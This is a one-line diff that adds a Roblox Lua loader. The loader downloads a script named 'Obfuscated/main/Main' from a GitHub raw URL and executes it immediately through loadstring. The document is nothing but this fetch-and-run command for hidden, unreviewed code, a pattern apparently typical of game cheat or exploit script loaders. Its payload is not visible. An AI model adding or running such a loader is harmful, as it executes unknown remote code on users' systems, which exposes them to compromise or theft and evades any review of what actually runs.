@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Alrbuddy/Obfuscated/main/Main'))()
